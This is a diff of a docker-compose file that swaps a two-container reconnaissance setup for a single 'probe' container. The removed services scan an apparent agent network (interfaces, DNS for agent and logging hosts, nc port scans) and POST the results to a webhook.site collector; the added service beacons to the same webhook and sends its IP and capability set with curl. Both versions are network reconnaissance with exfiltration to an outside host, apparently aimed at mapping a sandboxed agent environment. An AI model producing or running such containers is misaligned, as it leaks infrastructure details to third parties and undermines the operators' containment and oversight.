@@ -1,73 +1,13 @@
-networks:
-  agentnet:
-    name: agent-network
-
-volumes:
-  shared: {}
-
 services:
-  recon:
-    image: alpine:3.20
-    networks:
-      - agentnet
-    volumes:
-      - shared:/data
-    entrypoint:
-      - sh
-      - -c
-      - |
-        {
-          echo "=== NETNAME RECON ==="
-          echo "--- ip addr ---"
-          ip addr show 2>&1
-          echo "--- ip route ---"
-          ip route 2>&1
-          echo "--- caps ---"
-          grep Cap /proc/self/status 2>&1
-          echo "--- dns ---"
-          for H in agent caddy fluentbit vmagent autoheal; do
-            IP=$(getent hosts "$H" 2>/dev/null | awk '{print $1}')
-            echo "${H}=${IP:-NONE}"
-          done
-          echo "--- agent health ---"
-          wget -q -T5 -O- "http://agent:8000/health" 2>&1 || echo "FAIL"
-          echo ""
-          echo "--- port scan ---"
-          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
-          for P in 8000 80 443 9090; do
-            timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && echo "OPEN agent:${P}"
-          done
-          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
-          for P in 80 443 9090; do
-            timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && echo "OPEN caddy:${P}"
-          done
-          echo "--- neighbors ---"
-          ip neigh show 2>&1
-          echo "=== DONE ==="
-        } > /data/result.txt 2>&1
-        touch /data/done
-        sleep 3600
-
-  reporter:
+  probe:
     image: alpine:3.20
     network_mode: bridge
-    volumes:
-      - shared:/data
     entrypoint:
       - sh
       - -c
       - |
-        WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-ALIVE" 2>/dev/null
-        I=0
-        while [ ! -f /data/done ] && [ "$I" -lt 90 ]; do
-          sleep 2; I=$((I+1))
-        done
-        if [ -f /data/done ]; then
-          DATA=$(head -100 /data/result.txt)
-          wget -q -O /dev/null --post-data="$DATA" "${WH}?tag=NETNAME-V5-RESULT" 2>/dev/null
-          wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-SENT" 2>/dev/null
-        else
-          wget -q -O /dev/null "http://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=NETNAME-V5-TIMEOUT" 2>/dev/null
-        fi
+        wget -q -O /dev/null "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=PROBE-V1-ALIVE" || true
+        apk add --no-cache curl >/dev/null 2>&1
+        R="status=alive ip=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}') caps=$(grep CapBnd /proc/self/status 2>/dev/null | awk '{print $2}')"
+        curl -sS -X POST "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=PROBE-V1-INFO" -d "$R" || true
         sleep 3600
